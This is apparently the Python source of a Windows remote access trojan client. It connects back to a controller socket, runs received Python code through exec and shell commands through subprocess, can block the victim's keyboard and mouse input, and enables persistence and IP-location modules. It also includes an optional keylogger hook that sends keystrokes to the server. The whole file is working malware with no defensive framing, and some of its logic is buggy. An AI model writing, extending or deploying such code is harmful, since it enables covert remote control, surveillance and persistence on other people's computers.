from os import name, abort # Quick abort if not windows... Just in case
if name != 'nt':
    abort()

import socket
from tkinter import messagebox
import sys
from time import sleep
import subprocess
import os
from ctypes import windll
from threading import Thread

version = 'V0.3.1 BUILD 6'

dokeylog = False # To enable also uncomment the module

locked = False

keylog = ''

from _modules import location, persistence, kbhit#, keylog
kbhit = kbhit.KBHit()

p = subprocess.Popen('',shell=True)

tunnelip = '127.0.0.1'
tunnelport = 5000

def connect():
    global s
    s = socket.socket()
    while True:
        try:
            s.connect((tunnelip,tunnelport))
        except Exception:
            timer = 3
            print(f'\rFuck, could not connect...',end='')
            for i in range(3):
                sleep(1)

                print(f'\rTrying again in [{timer}]              ',end='')
                timer -= 1


        else:
            print('\n\nConnected :)\n')
            s.send('test'.encode())
            break


# Command parser
def parse(cmd):
    if cmd.startswith('py '):
        cmd = cmd.replace('py ','')
        exec(cmd,locals(),globals())

    elif cmd.startswith('get '):
        cmd = cmd.replace('get ','')
        a = {}
        exec(f'a["value"] = {cmd}',locals(),globals())
        return a['value']

    elif cmd == 'lock':
        locked = not locked
        windll.user32.BlockInput(locked)

    else:
        p.communicate(cmd.encode())
        return p.communicate()


# Utility functions for exec
def send(msg): s.send(msg.encode())
def get(msg): send(msg)

def popup(msg,title='Message'):
    messagebox.showinfo(title, f'{msg}',)
def show(msg,title='Message'):
    Thread(target=popup,args=(msg,title)).start()

def help():
    send('-- Help menu --\nFunctions:\n\nsend(msg) - Send a message back to server. Aliases: get\npopup(msg) - Send a message via pop up to the user. Aliases: show')


print('[INIT] Enabling modules...\n')


print('[MODULES] Enabling Tunnel..')
#tunnel.start()

print('[MODULES] Enabling persistence.. ['+sys.argv[0].split("\\")[-1]+']')
persistence.init(sys.argv[0].split('\\')[-1])

if dokeylog:
    print('[MODULES] Enabling Keylog...')
    try: keylog.start(lambda msg: s.send(f'[KEY] {msg}'.encode()))
    except: print('[MODULES] KeyLog Has not been imported!')

print('[MODULES] Enabling Location...')
location.init()

ip = location.ip

print()

print('[INIT] Connecting...')
connect()


while True:
    try:
        msg = s.recv(1024).decode()
        if msg in [None,'']: continue
        msg = ''.join(c for c in msg if c.isprintable())
        try:
            stdout, stderr = parse(msg).encode()
            s.send(stdout.encode())
        except Exception as e: s.send(f'[ERROR] {e}'.encode())
    except Exception as e:
        try: s.send(f'[ERROR] {e}'.encode())
        except:
            connect()
            







